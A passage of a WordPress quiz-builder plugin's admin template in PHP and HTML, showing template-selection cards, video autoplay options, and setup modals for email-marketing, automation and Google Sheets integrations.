										<input type="text" id="game_animation_audio_url" name="game_animation_audio_url" class="form-control" value="<?php echo $audio_url; ?>" placeholder="Enter audio file URL" >
									</div>
								</div>
								
								<div class="quiz_right-content mt-4">
									<label>Animation Text</label>
									<div class="animation text">
										<textarea class="sqb_text_editor" name="game_animation_text" id="game_animation_text" style="height: 200px;"><?php echo stripslashes($text_ga); ?></textarea> 
									</div>
								</div>
							</div>	
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>

	<?php 
		$interactive_video_autoplay = "Y";
		$buffer_on_load = "";
		$click_to_unmute = "N";
		if(isset($quiz_data) && ($quiz_data->getId() !='')){
			$getAllOtherOptions = $quiz_data->getAllOtherOptions();
			if(!empty($getAllOtherOptions) && $getAllOtherOptions != 'NULL'){
				$all_other_options = maybe_unserialize($getAllOtherOptions);

				if(!empty($all_other_options['interactive_video_autoplay'])){
					$interactive_video_autoplay = $all_other_options['interactive_video_autoplay'];
				}

				if(!empty($all_other_options['buffer_on_load'])){
					$buffer_on_load = $all_other_options['buffer_on_load'];
				}

				if(!empty($all_other_options['click_to_unmute'])){
					$click_to_unmute = $all_other_options['click_to_unmute'];
				}

			}
	} ?>

	<div class="quiz-content-card template9-customizer-options" style="<?php if($template_checked9 == "checked"){  }else{ echo 'display:none;'; } ?>">
		<h5 class="quiz--sub-title">Interactive Video</h5>	
		<label class="quiz_label">Autoplay</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="interactive_video_autoplay" type="checkbox" id="interactive_video_autoplay" value="Y" <?php echo ($interactive_video_autoplay == 'Y') ? 'checked' : ''; ?>>
				<label for="interactive_video_autoplay"></label>
			</div>
		</div>

		<label class="quiz_label mt-2">Click to Unmute</label>	
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="click_to_unmute" type="checkbox" id="click_to_unmute" value="Y" <?php echo ($click_to_unmute == 'Y') ? 'checked' : ''; ?>>
				<label for="click_to_unmute"></label>
			</div>
		</div>

		<div class="sqb_select_certificate_message mt-2" style="max-width: 1110px;">
			<span>If you set autoplay to on, it'll automatically play the video in the background but it'll be muted. You can display "click to unmute" text over the video to let users know how to unmute. Enable it above.</span>
			<br>
			<br>
			<span class="mt-2">You can change the text in <a href="<?php echo site_url(); ?>/wp-admin/admin.php?page=sqb_settings&tab=message_customizer" target="_blank">SQB >>Settings >> Customize Messages</a> tab.</span>
		</div>

	</div>	

	<!-- <div class="quiz-content-card template9-customizer-options" style="<?php if($template_checked9 == "checked"){  }else{ echo 'display:none;'; } ?>">
		<div class="buffer-tooltip">
			<h5 class="quiz--sub-title">Wait for Buffering 
				<div class="tool-tip" style="margin-left:10px;"><i class="fa fa-info-circle" aria-hidden="true"></i>
					<div class="toll-tip-desc pdf-report-tooltip" style="max-width: 500px;"><p>Buffering means loading the video ahead of time, so that there is no lag when the video actually starts playing.</p>
					<p>If you set this to "Yes", then as soon as the page loads, the video will start buffering ahead (buffering not the same as playing).</p>
					<p>If you uncheck this, then video will start buffer ahead only after viewer clicks the play button.</p></div>
				</div>
			</h5>
		</div>
		<label class="quiz_label">(only applicable if you upload video to your server) </label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="buffer_on_load" type="checkbox" id="buffer_on_load" value="Y" <?php echo ($buffer_on_load == 'Y') ? 'checked' : ''; ?>>
				<label for="buffer_on_load"></label>
			</div>
		</div>
	</div>	 -->

	

	 <!-- timer html closed ---> 
	<div class="quiz-content-card quiz_seltemplate_outer">
		
		<h5 class="quiz--sub-title">Select a Template</h5>
		<div class="quiz_right-content">
			<ul class="Template-listing">
				<li>
					<h4>Template 1</h4>
					<div class="templates_images <?php if($template_checked1 == "checked"){ echo "active_template_cls"; } ?>  " id="container_template1">
						<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/template_img1.jpg";?>" class="temp_img">
						<div class="base-div" >
							<label class="preview-template" data-target="#template-prew-popup-template1" data-toggle="modal">
								<input type="radio"   class="btn">Preview
							</label>
							<label class="" for ="select_template1">
								<input type="radio" id="select_template1" name="select_temp" value="template1" <?php echo $template_checked1; ?> class="btn" />Select
							</label>
						</div>
					</div>
				</li>
				<li>
					<h4>Template 2</h4>
					<div class="templates_images <?php if($template_checked2 == "checked"){ echo "active_template_cls"; } ?>" id="container_template2">
						<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/template_img2.jpg";?>" class="temp_img">
						<div class="base-div" >
								<label class="preview-template" data-target="#template-prew-popup-template4" data-toggle="modal">
								<input type="radio"   class="btn">Preview
							</label>
							<label class="" for ="select_template2">
								<input type="radio" id="select_template2" name="select_temp" value="template2" <?php echo $template_checked2; ?> class="btn"  />Select
							</label>
						</div>
					</div>
				</li>
				<li>
					<h4>Template 3</h4>
					<div class="templates_images <?php if($template_checked3 == "checked"){ echo "active_template_cls"; } ?>"  id="container_template3">
						<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/template_img3.jpg";?>" class="temp_img">
						<div class="base-div" >
							<label class="preview-template" data-target="#template-prew-popup-template5" data-toggle="modal">
								<input type="radio"   class="btn">Preview
							</label>
							<label class="" for ="select_template3">
								<input type="radio" name="select_temp" id="select_template3" value="template3" <?php echo $template_checked3; ?> class="btn"  />Select
							</label>
						</div>
					</div>
				</li>
				<li>
					<h4>Template 4</h4>
					<div class="templates_images <?php if($template_checked4 == "checked"){ echo "active_template_cls"; } ?>" id="container_template4">
						<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/template_img4.jpg";?>" class="temp_img">
						<div class="base-div" >
							<label class="preview-template" data-target="#template-prew-popup-template3" data-toggle="modal">
								<input type="radio"   class="btn">Preview
							</label>
							<label class="" for ="select_template4">
								<input type="radio" id="select_template4" name="select_temp" value="template4" <?php echo $template_checked4; ?> class="btn"  />Select
							</label>
						</div>
					</div>
				</li>
			</ul>
					
		</div>
	</div>


	<!-- Transparent Template -->
	<div class="quiz-content-card quiz_seltemplate_outer">
		
		<h5 class="quiz--sub-title">Transparent Background Template</h5>
		<div class="quiz_right-content">
			<ul class="Template-listing">
				<li>
					<h4 style="margin-bottom: 24px;">Template 5</h4>
					<div class="templates_images <?php if($template_checked8 == "checked"){ echo "active_template_cls"; } ?>  " id="container_template8">
						<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/template8-icon.jpg";?>" class="temp_img">
						<div class="base-div" >
							<!--<label class="preview-template" data-target="#ecommerce-template-prew-popup-template1" data-toggle="modal">
								<input type="radio"   class="btn">Preview
							</label>-->
							<label class="" for ="select_template8">
								<input type="radio" id="select_template8" name="select_temp" value="template8" <?php echo $template_checked8; ?> class="btn" />Select
							</label>
						</div>
					</div>
				</li>
				<li class="template-six" style="display:<?php echo $display_template5_style; ?>">
					<h4 style="margin-bottom: 22px;">Template 6</h4>
					<div class="templates_images <?php if($template_checked5 == "checked"){ echo "active_template_cls"; } ?>" id="container_template5">
						<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/template-5-main.jpg";?>" class="temp_img">
						<div class="base-div" >
							
							<label class="preview-template" data-target="#template-prew-popup-template2" data-toggle="modal">
								<input type="radio"   class="btn">Preview
							</label>
							<label class="" for ="select_template5">
								<input type="radio" id="select_template5" name="select_temp" value="template5" <?php echo $template_checked5; ?> class="btn"  />Select
							</label>
						</div>
					</div>
				</li>
				<li class="template-seven" style="<?php if(isset($quiz_data) && ($quiz_type == "poll")){echo 'display:none';}?>">
					<h4 style="margin-bottom: 22px;" class="change_template_name"><?php if(isset($quiz_data) && ($quiz_data->getQuizPagination() == 'all')){echo 'Template6';}else{ echo 'Template 7';} ?></h4>
					<div class="templates_images <?php if($template_checked6 == "checked"){ echo "active_template_cls"; } ?>  " id="container_template6">
						<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/template6_img6.png";?>" class="temp_img">
						<div class="base-div" >

							<label class="preview-template" data-target="#transparent-template-prew-popup-template1" data-toggle="modal">
								<input type="radio"   class="btn">Preview
							</label>

							<label class="" for ="select_template6">
								<input type="radio" id="select_template6" name="select_temp" value="template6" <?php echo $template_checked6; ?> class="btn" />Select
							</label>
						</div>
					</div>
				</li>
				<li class="template-ecommerce">
					<h4 style="margin-bottom: 22px;">Template 8 (eCommerce)</h4>
					<div class="templates_images <?php if($template_checked7 == "checked"){ echo "active_template_cls"; } ?>  " id="container_template7">
						<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/template7-icon.jpg";?>" class="temp_img">
						<div class="base-div" >
							<label class="preview-template" data-target="#ecommerce-template-prew-popup-template1" data-toggle="modal">
								<input type="radio"   class="btn">Preview
							</label>
							<label class="" for ="select_template7">
								<input type="radio" id="select_template7" name="select_temp" value="template7" <?php echo $template_checked7; ?> class="btn" />Select
							</label>
						</div>
					</div>
				</li>
			</ul>
		</div>
	</div>


	<!-- Transparent Template -->
	<div class="quiz-content-card quiz_seltemplate_outer interactive_video_template" style="<?php if(isset($quiz_data) && ($quiz_data->getQuizPagination() == 'all')){echo 'display:none';} ?>">
		
		<h5 class="quiz--sub-title">Interactive Video OR Image Template (split screen supported)</h5>
		<div class="quiz_right-content">
			<ul class="Template-listing">
				<li class="template9">
					<h4>Template 9</h4>
					<div class="templates_images <?php if($template_checked9 == "checked"){ echo "active_template_cls"; } ?>  " id="container_template9">
						<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/template9-icon.png";?>" class="temp_img">
						<div class="base-div" >
							<label class="preview-template" data-target="#template-prew-popup-template9" data-toggle="modal">
								<input type="radio"   class="btn">Preview
							</label>
							<label class="" for ="select_template9">
								<input type="radio" id="select_template9" name="select_temp" value="template9" <?php echo $template_checked9; ?> class="btn" />Select
							</label>
						</div>
					</div>
				</li>	
			</ul>
		</div>
	</div>

	
	<div class="quiz-actions">
		 <a href="javascript:void(0)" class="quiz--btn quiz-prev-btn" onclick="sqb_next_tab('Basic-Settings')"> Previous </a>
		<a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_quiz('Basic-Screen-Settings')"> Save </a>

		<a href="javascript:void(0)" class="quiz--btn quiz-next-btn show-start-screen-settings" onclick="sqb_save_quiz('Start-Screen-Settings','next','display_tab')"> Save & Next </a>
		
		<a href="javascript:void(0)" class="quiz--btn quiz-next-btn show-quiz-screen-setting" onclick="sqb_save_quiz('Quiz-Screen-Settings','next','start_tab')" style="display:none;"> Save & Next </a>

		<a href="javascript:void(0)" class="quiz--btn quiz-next-btn show-lead-page-for-form-quiz-type" style="<?php if(isset($quiz_data) && $quiz_display_inpage_checked != 'inpage'){ echo 'display: none;'; } ?>" onclick="sqb_save_quiz('Opt-Screen-Settings','next','questions_tab')"> Save & Next </a>
	</div>
 

</div>


<div class="modal fade popup--style vertical--center-modal zapier_save_model" id="user_add_my_email_plateform_zapier_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document" style="max-width: 850px;">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Automation Platform Integration</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				
				<?php 
				$zapier_obj_exists = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($sqbeditid,'zapier');
				$zapier_url = '';
				if(isset($zapier_obj_exists)){
					$zapier_url = $zapier_obj_exists[0]->getActionData();
				}
				if($zapier_url != ''){
				?>
				<label class="email_plateform_popup_label">Enter URL Here</label>
				<?php } ?>
				
				
				<input class="form-control input" name="zapier_url" id="zapier_url" value="<?php echo $zapier_url;?>" placeholder="Enter URL Here">
			</div>
		</div>
		<div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<span style="color: green;display:none" class="testzap_msg" >Connection established </span><br>
				<a href="#" class="testzap" style="    box-shadow: none;" id="test_zapier_url" onclick="sqb_autoresponder_test_zapier(this)">Click Here to Test Connection</a>
				<div class="zapierInfoSection">
					<div class="popup_data_msg mb-2">Integrates with: Zapier, Integrately, Pabbly Connect Details, GoHighLevel, Encharge, KonnectzIT, SyncSpider, Autonami</div>
				</div>
			</div>
		</div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary save_automation_zapier_btn" data-action-id="zapier">Save</button>
      </div>
    </div>
  </div>
</div>


<div class="modal fade popup--style vertical--center-modal" id="google_sheet_plugin_not_active" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document" style="max-width: 700px;">
    <div class="modal-content">
      <div class="modal-body">
        <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<ul>
					<li><span><strong>We notice that you have not installed the "SQB Google Sheet Integration" plugin that's required to use this integration.</strong></span></li>
					<li><span><strong>Please follow these steps.</strong> </span></li>
					<li><span>Download the "SQB Google Sheet Integration" plugin from your members area. <a href="https://wickedcoolplugins.com/login" target="_blank">Click here</a> to login and download.</span></li>
					<li><span>- Activate the plugin</span></li>
					<li><span>- In the WP admin >> settings >> SQB Google Sheet page, connect SQB with your google account.</span></li>
				</ul>
			</div>
		</div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>



<div class="modal fade popup--style vertical--center-modal googlespreadsheet_save_model" id="user_add_my_email_plateform_googlespreadsheet_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document" style="max-width: 850px;">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Google Spreadsheet</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				
				<?php 
				$googlespreadsheet_url = '';
				if ( is_plugin_active('sqb-gspreadsheet/sqb-gspreadsheet.php') ) {
					$googlespreadsheet_obj_exists = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($sqbeditid,'googlespreadsheet');
					
					if(isset($googlespreadsheet_obj_exists)){
						$googlespreadsheet_url = $googlespreadsheet_obj_exists[0]->getActionData();
					}
				}
				
				if($googlespreadsheet_url != ''){
				?>
				<label class="email_plateform_popup_label">Create a blank SHEET in Google Sheets. Enter your sheet URL below</label>
				<?php } ?>
				
				
				<input class="form-control input" name="googlespreadsheet_url" id="googlespreadsheet_url" value="<?php echo $googlespreadsheet_url; ?>" placeholder="Enter your sheet URL">
				<a href="https://smartquizbuilder.com/sqb-doc/sqbsheet" target="_blank" class="btn btn-primary spreadsheet-how-it-work">How it works</a>
				<!-- <button type="button" class="btn btn-primary spreadsheet-how-it-work" data-toggle="modal" data-target="#spreadsheet_how_it_work" >How it works</button> -->
			</div>
		</div>
		<div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<span style="color: green;display:none" class="testgooglesheet_msg" >Connection established </span><br>
				<span style="color: red;display:none" class="testgooglesheet_error_msg"></span>
				
				<div class="required-fields" style="display:none">
					<span><strong>Missing Required Fields:</strong></span><br>
					<span>first_name, email, quiz_name</span>
				</div>
				<div class="other-field" style="display:none">
					<span><strong>Other Fields:</strong></span><br>
					<span class="other-field-data"></span>
					<p></p>
					<span>Please create these fields / headings in your sheet.</span>
					<p></p>
				</div>
				<div class="other-field-success" style="display:none">
					<span><strong>Here are the fields SQB will send to your sheet.</strong></span><br>
					<span class="other-field-data"></span>
					<p></p>
				</div>
				<!-- <div id="dvData" style="display:none;">
				    <table>
				        <tbody><tr class="append-spreadsheet-fields"></tr>
				    </tbody></table>
				</div> -->
			</div>
			<div class="col-sm-12" style="text-align:center;">
				<a href="#" class="testgooglesheet" style="    box-shadow: none;" id="test_googlesheet_url" onclick="sqb_autoresponder_test_google_sheet(this)">Click Here to Test Connection</a>
			</div>
		</div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary save_automation_googlespreadsheet_btn" data-action-id="googlespreadsheet">Save</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade popup--style vertical--center-modal spreadsheet_how_it_work" id="spreadsheet_how_it_work" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document" style="max-width: 850px;">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">How it set it up</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<ul>
					<li><span>Step 1:</span> Visit (<a target="_blank" href="https://console.developers.google.com">Click Here</a>)</li>

					<li><span>Step 2: </span>Create a new project <a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/1.png">See Image</a></li>

					<li><span>Step 3: </span>Give Project Name. <a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/2.png">See Image</a></li>
					
					<li><span>Step 4:</span>Select "APIs & Services" then select "Library" <a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/3.png">See Image</a></li>

					<li><span>Step 5:</span> Search for Google Sheets API <a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/4.png">See Image</a></li>

					<li><span>Step 6:</span> Enable It <a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/5.png">See Image</a></li>

					<li><span>Step 7:</span> Select Enabled APIs & Services <a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/6.png">See Image</a></li>

					<li><span>Step 8:</span> Click on "Create Credentials" then select "OAuth Client ID"<a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/7.png">See Image</a></li>

					<li><span>Step 9:</span> Click on "Configure Consent Screen"<a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/8.png">See Image</a></li>

					<li><span>Step 10:</span> Click on "Create"<a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/9.png">See Image</a></li>

					<li><span>Step 11:</span> Enter all Required field<a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/10.png">See Image</a></li>

					<li><span>Step 12:</span> On Scopes Check All<a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/11.png">See Image</a></li>

					<li><span>Step 13:</span> Click on Save and Continue<a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/12.png">See Image</a></li>

					<li><span>Step 14:</span> 
						Select Application type as "Web Application".
						<br>
						In Authorized JavaScript origins Enter URL of Your Site. 
						<br>
						In Authorized redirect URIs enter your domain name after that enter "wp-admin/admin-post.php?action=sbqgs_authentication".
						<a href="javascript:void(0)" class="google-sheet-img" data-img="../wp-content/plugins/smartquizbuilder/includes/images/googlesheet/13.png">See Image</a></li>

					<li><span>Step 15:</span> Then You can Get Client ID and Secret Key. This need to be enter in WP admin >> settings page >> SQB Google Sheet. Then Click on Authenticate Google.</li>

					<li><span>Step 16:</span> Create New Sheet. Copy the URL of the Sheet enter it in the quiz click on "connect" and paste the URl. Then Click on "Click Here to Test Connection"</li>
					

					
				</ul>
				
			</div>
		</div>
		
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>


<!-- Modal -->
<div class="modal fade popup--style vertical--center-modal activecampaign_save_model" id="user_add_my_email_plateform_activecampaign_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Activecampaign Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				
				 <?php if($activecompaign_url != ''){ ?>
					<label class="email_plateform_popup_label">Enter API URL</label>
				<?php } ?>
				
				<input class="form-control input" name="api_url" id="api_url" value="<?php echo $activecompaign_url;?>" placeholder="API URL">
			</div>
		</div>
		<div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				 <?php if($activecompaign_key != ''){ ?>
					<label class="email_plateform_popup_label">Enter API Key</label>
				<?php } ?>
				
				
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $activecompaign_key;?>" placeholder="API Key">
			</div>
		</div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary save_automation_btn" data-action-id="activecampaign">Save</button>
      </div>
    </div>
  </div>
</div>


<div class="modal quiz-popup-style fade" id="google-sheet-img-popup" tabindex="-1" role="dialog" aria-labelledby="google-sheet-img-popup" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<img class="get_googlesheet_image" src="">

			</div>
			<!-- <div class="modal-footer quiz-popup-actions">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div> -->
		</div>
	</div>
</div>


<div class="modal fade popup--style vertical--center-modal" id="google-sheet-notid" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document" style="max-width: 700px;">
    <div class="modal-content">
      <div class="modal-body">
        <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<span><strong>To add this google sheet integration:</strong></span>
				<ul>
					<li>1. You need to first setup the quiz fully. Add questions, outcomes, etc.</li>
					<li>2. Next come back here to complete the google sheet integration.</li>
				</ul>
			</div>
		</div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>



<!-- Modal -->
<div class="modal fade popup--style vertical--center-modal aweber_save_model " id="user_add_my_email_plateform_aweber_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Awber Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
      <div class="form-group row ">
		  <div class="col-sm-12 aweber_connect_link">
					<a style="color:blue;" target="_blank" href="https://auth.aweber.com/1.0/oauth/authorize_app/06825be9">Click Here to Authorize SQB to Connect To Your AWeber Account</a>
		  </div>
	  </div>
      <div class="form-group row ">
			
			<div class="col-sm-12">
				   
				     <?php if($aweber_key != ''){ ?>
					 <label class="email_plateform_popup_label">Enter Verification Code</label>
					<?php } ?>
				    
					<input class="form-control input" name="api_keys" id="api_keys" value="<?php echo $aweber_key;?>" placeholder="API Key">
				</div>
		</div>	
		 
		
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary  save_automation_btn" data-action-id="aweber">Save</button>
      </div>
    </div>
  </div>
</div>



<!-- Modal -->
<div class="modal fade popup--style vertical--center-modal  convertkit_save_model" id="user_add_my_email_plateform_convertkit_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Convertkit Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group row ">
			
			<div class="col-sm-12">
				   
				    <?php if($convertkit_key != ''){ ?>
					 <label class="email_plateform_popup_label">Enter API Key</label>
					<?php } ?>
					<input class="form-control input" name="api_key" id="api_key" value="<?php echo $convertkit_key;?>" placeholder="API Key">
				</div>
		</div>	
		 <div class="form-group row ">	
				<div class="col-sm-12">
					<?php if($convertkit_secret != ''){ ?>
					<label class="email_plateform_popup_label">Enter API SECRET Key</label>
					<?php } ?>
					
					<input class="form-control input" name="api_secret" id="api_secret" value="<?php echo $convertkit_secret;?>" placeholder="API SECRET">
				</div>
		</div>
		
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary save_automation_btn" data-action-id="convertkit">Save</button>
      </div>
    </div>
  </div>
</div>




<!-- Modal -->
<div class="modal fade popup--style vertical--center-modal  mailchimp_save_model" id="user_add_my_email_plateform_mailchimp_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Mailchimp Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group row ">
			
			<div class="col-sm-12">
				
				<?php if($mailchimp_api_key != ''){ ?>
				<label class="email_plateform_popup_label">Enter API Key</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $mailchimp_api_key;?>" placeholder="API Key">
			</div>
		</div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="mailchimp">Save</button>
      </div>
    </div>
  </div>
</div>



<div class="modal fade popup--style vertical--center-modal drip_save_model" id="user_add_my_email_plateform_drip_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Drip Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($drip_url != ''){ ?>
				<label class="email_plateform_popup_label">Enter Client ID</label>
				<?php } ?>
				<input class="form-control input" name="client_id" id="client_id" value="<?php echo $drip_url;?>" placeholder="Client ID">
			</div>
		</div>
		<div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($drip_key != ''){ ?>
				<label class="email_plateform_popup_label">API Token</label>
				<?php } ?>
				<input class="form-control input" name="api_token" id="api_token" value="<?php echo $drip_key;?>" placeholder="API Token">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="drip">Save</button>
      </div>
     
    </div>
  </div>
</div>


<div class="modal fade popup--style vertical--center-modal hubspot_save_model" id="user_add_my_email_plateform_hubspot_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Hubspot Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($hubspot_auth_token != ''){ ?>
				<label class="email_plateform_popup_label">Enter Auth Token</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $hubspot_auth_token;?>" placeholder="Auth Token">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="hubspot">Save</button>
      </div>
     
    </div>
  </div>
</div>

<div class="modal fade popup--style vertical--center-modal acumbamail_save_model" id="user_add_my_email_plateform_acumbamail_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Acumbamail Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($acumbamail_auth_token != ''){ ?>
				<label class="email_plateform_popup_label">Enter Auth Token</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $acumbamail_auth_token;?>" placeholder="Auth Token">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="acumbamail">Save</button>
      </div>
     
    </div>
  </div>
</div>

<div class="modal fade popup--style vertical--center-modal sendinblue_save_model" id="user_add_my_email_plateform_sendinblue_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
